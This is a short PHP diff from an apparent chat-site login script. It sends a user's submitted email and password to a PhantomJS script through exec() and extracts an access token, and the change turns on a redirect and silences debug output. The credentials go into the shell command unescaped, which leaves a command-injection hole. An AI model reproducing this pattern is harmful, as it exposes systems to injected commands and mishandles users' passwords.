@@ -12,7 +12,7 @@ grava();
 if($token == "invalid"){
  echo '<a href="index.php" style="font-family:arial; font-size:11px;">Failed to Log In. Try Again.</a>';
 }else{
-//header('Location: chat.php'); 
+header('Location: chat.php'); 
 //header('Location: chat.php?tk=' . $token); 
 }
 exit;
@@ -27,12 +27,12 @@ $pathToJsScript = dirname(__FILE__). '/browser_fb.js';
 $varin1 = $login_email;
 $varin2 = $login_pass;
 $stdOut = exec(sprintf('%s %s %s %s', $pathToPhatomJs,  $pathToJsScript, $varin1, $varin2), $out);
-echo $stdOut;
+//echo $stdOut;
 
 $pos1 = strpos($stdOut, "access_token=") + 13;
 $pos2 = strpos($stdOut, "&expires_in");
 $token = substr($stdOut,$pos1,$pos2 - $pos1);
-echo $token;
+//echo $token;
 
 return $token;
 }
